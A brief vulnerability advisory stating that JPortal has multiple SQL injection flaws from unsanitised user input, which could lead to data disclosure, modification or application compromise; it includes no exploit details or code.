JPortal is prone to multiple SQL injection vulnerabilities. These are due to a lack of proper sanitization of user-supplied input before being used in an SQL query.

Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
